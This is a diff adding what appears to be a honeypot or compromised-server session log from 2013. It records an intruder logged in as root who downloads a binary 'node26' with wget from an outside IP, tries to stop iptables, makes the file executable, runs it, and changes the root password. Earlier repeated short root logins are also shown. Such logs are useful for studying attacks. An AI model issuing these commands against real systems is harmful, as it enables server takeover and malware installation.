@@ -1,0 +1,65 @@
+[4hAWSWeb:~# w
+[4l 00:39:47 up 133 days, 2:43,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    125.65.82.89      00:39    0.09   0.05   0.05 w
+[4hAWSWeb:~# ethtool eth0
+bash: ethtool: command not found
+AWSWeb:~# wget ethtool eth0
+[4l--2013-06-07 00:41:04--  http://ethtool
+Connecting to ethtool:80... connected.
+HTTP request sent, awaiting response... DNS lookup failed: address 'ethtool' not found: [Errno -2] Name or service not known.
+[4hAWSWeb:~# wget http://61.147.103.152:8090/node26
+[4l--2013-06-07 00:41:13--  http://61.147.103.152:8090/node26
+Connecting to 61.147.103.152:8090... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1524643 (1M) [application/octet-stream]
+Saving to: `node26
+
+ 0% [>                                      ] 1,460        3K/s  eta 7m 53s 1% [>                                      ] 23,360       21K/s  eta 1m 10s 7% [==>                                    ] 108,040      61K/s  eta 22s   13% [=====>                                 ] 204,400      85K/s  eta 15s19% [=======>                               ] 299,300      103K/s  eta 11s23% [=========>                             ] 365,000      104K/s  eta 11s33% [=============>                         ] 515,380      128K/s  eta 7s 45% [=================>                     ] 692,040      150K/s  eta 5s62% [========================>              ] 949,000      186K/s  eta 3s73% [============================>          ] 1,127,416    198K/s  eta 1s94% [====================================>  ] 1,438,396    226K/s  eta 0s95% [=====================================> ] 1,448,616    207K/s  eta 0s95% [=====================================> ] 1,452,996    189K/s  eta 0s100%[======================================>] 1,524,643    189K/s
+
+2013-06-07 00:41:21 (189 KB/s) - `node26' saved [1524643/1524643]
+[4hAWSWeb:~# /etc/init.d/iptables stop
+bash: /etc/init.d/iptables: command not found
+AWSWeb:~# chmod 0755 ./node26
+[4l[4hAWSWeb:~# ./node26
+bash: ./node26: command not found
+AWSWeb:~# w
+[4l 00:42:25 up 133 days, 2:46,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    125.65.82.89      00:39    0.09   0.05   0.05 w
+[4hAWSWeb:~# last
+[4lroot	pts/0	117.79.91.55	Thu Jun 06 20:22 - 20:22 (00:03)
+root	pts/0	117.79.91.55	Thu Jun 06 20:22 - 20:22 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:22 - 20:22 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:22 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:03)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:03)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:03)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:04)
+root	pts/0	117.79.91.55	Thu Jun 06 20:23 - 20:23 (00:07)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:04)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:05)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:05)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:32 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:32 - 00:33 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:33 - 00:33 (00:04)
+root	pts/0	123.127.237.39	Fri Jun 07 00:33 - 00:33 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:33 - 00:33 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:33 - 00:33 (00:03)
+root	pts/0	123.127.237.39	Fri Jun 07 00:33 - 00:33 (00:03)
+
+[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# w
+[4l 00:42:47 up 133 days, 2:46,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    125.65.82.89      00:39    0.09   0.05   0.05 w
+[4hAWSWeb:~# 
